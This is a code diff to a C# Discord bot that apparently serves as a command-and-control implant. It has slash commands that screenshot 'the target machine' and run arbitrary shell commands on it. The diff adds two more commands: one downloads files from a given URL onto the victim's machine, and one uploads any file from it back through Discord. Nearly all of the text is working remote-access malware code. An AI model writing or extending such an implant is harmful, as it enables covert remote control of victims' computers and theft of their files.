@@ -8,7 +8,7 @@ public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionCo
     [SlashCommand("ping", "pong")]
     public async Task Ping(string id)
     {
-        if (id != Utils.MD5Hash(Utils.HostId))
+        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
             return;
 
         await DeferAsync();
@@ -18,7 +18,7 @@ public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionCo
     [SlashCommand("screenshot", "take a screenshot of the target machine")]
     public async Task Screenshot(string id)
     {
-        if (id != Utils.MD5Hash(Utils.HostId))
+        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
             return;
             
         await DeferAsync();
@@ -28,7 +28,7 @@ public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionCo
     [SlashCommand("execute", "execute a command on the target machine")]
     public async Task Execute(string id, string command)
     {
-        if (id != Utils.MD5Hash(Utils.HostId))
+        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
             return;
 
         await DeferAsync();
@@ -50,5 +50,30 @@ public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionCo
             await FollowupAsync($"```\n{output}\n```");
         }
         
+    }
+
+    [SlashCommand("download", "download a file to the target machine")]
+    public async Task Download(string id , string url, string filename)
+    {
+        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
+            return;
+
+        await DeferAsync();
+        await FollowupAsync(Utils.DownloadFile(url, filename));
+    }
+
+    [SlashCommand("upload", "upload a file from the target machine")]
+    public async Task Upload(string id, string path)
+    {
+        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
+            return;
+        
+        await DeferAsync();
+
+        var filename = Environment.ExpandEnvironmentVariables(path);
+        if (File.Exists(filename))
+            await FollowupWithFileAsync(filename);
+        else
+            await FollowupAsync("file not found");
     }
 }
